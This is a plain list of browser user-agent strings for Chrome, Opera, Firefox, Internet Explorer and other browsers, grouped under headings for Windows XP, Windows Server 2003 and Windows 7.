		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.7 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/525.13. 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.201.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML,like Gecko) Chrome/3.0.195.27 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.24 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.20 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.17 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/3.0.191.3 Safari/531.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/3.0.191.0 Safari/531.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.178.0 Safari/530.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.177.1 Safari/530.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.177.0 Safari/530.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.177.0 Safari/530.7 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.176.0 Safari/530.7 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.7 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.6 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.0 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.8 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.42 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.40 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.39 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.2 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.170.0 Safari/530.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.169.0 Safari/530.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.9 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.9 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.11 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.11 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.0 Version/3.2.1 Safari/528.8 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.0 Safari/528.8 
		Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.55 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.4.154.18 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.4 (KHTML, like Gecko) Chrome/0.3.155.0 Safari/528.4 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.155.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13 
		Opera/7.51 (Windows NT 5.1; U) [en] 
		Opera/8.0 (Windows NT 5.1; U; en) 
		Opera/8.0 (Windows NT 5.1; U; zh-cn) 
		Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00 
		Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10 
		Opera/9.80 (Windows NT 5.1; U; Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18635/1030; U; en) Presto/2.4.15; ru) Presto/2.8.99 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0(Windows; U; Windows NT 5.1; en-US)/23.390; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/23.377; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/(Windows; U; Windows NT 5.1; en-US) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (Windows NT 5.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00 
		HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0

		Windows Server 2003: 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9 
		Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8 
		Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.41115) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; MyIE2; .NET CLR 1.1.4322) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; MyIE2; Maxthon; .NET CLR 1.1.4322) 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; rv:1.7.3) Gecko/20041001 Firefox/0.10.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8b) Gecko/20050212 Firefox/1.0+ (MOOX M3) 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_USA) 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_KO_KTF) 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZard/1.0; Server_KO_SKT) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_HK) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_EN) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_CN) 
		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP) 
		Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7 
		Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.652.0 Safari/534.17 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.558.0 Safari/534.10 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101027 Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.463.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.462.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.126 Safari/533.4 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.5 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.210.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; eu) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.6 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13

		windows 7: 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7 
		Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 
		Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Beamrise/17.2.0.9 Chrome/17.0.939.0 Safari/535.8 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 
		Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0) 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) 
		Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0) 
		Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0 
		Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01 
		Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Sleipnir/2.9.8) 
		Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.43 Safari/534.7 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAGW; .NET4.0C; Lunascape 6.5.8.24780) 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1 Fennec/7.0a1 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.2a1pre) Gecko/20110331 Firefox/4.2a1pre Fennec/4.1a1pre 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8) Gecko/20101221 Firefox/4.0b8 Fennec/4.0b3 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (Windows NT 6.1; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0 
		Mozilla/5.0 (Windows NT 6.1; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2a1pre) Gecko/20090317 Fennec/1.0b1 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/24.838; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows NT 6.1; WOW64) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.24214 (Windows; U; Windows NT 6.1) AppleWebKit/24.838; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (Windows NT 6.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36 
